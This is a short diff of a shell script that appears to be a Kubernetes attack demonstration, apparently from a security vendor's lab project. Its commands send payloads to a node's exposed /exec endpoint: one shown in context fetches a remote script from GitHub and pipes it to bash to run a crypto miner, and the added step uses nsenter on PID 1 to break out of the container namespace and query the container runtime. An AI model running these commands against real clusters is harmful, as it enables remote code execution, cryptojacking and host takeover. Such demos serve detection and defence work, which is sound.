@@ -18,3 +18,6 @@ curl -X POST $NODE_IP:30284/exec -d 'command=apt-get update; apt-get -y install 
 
 echo "4. Exploit running a script to run a crypto miner"
 curl -X POST $NODE_IP:30284/exec -d 'command=curl https://raw.githubusercontent.com/sysdiglabs/policy-editor-attack/master/run.sh | bash'
+
+echo "5. Break out of our namespace to the host's with nsenter and talk directly to the container runtime"
+curl -X POST $NODE_IP:30284/exec -d 'command=nsenter --all --target=1 crictl ps'
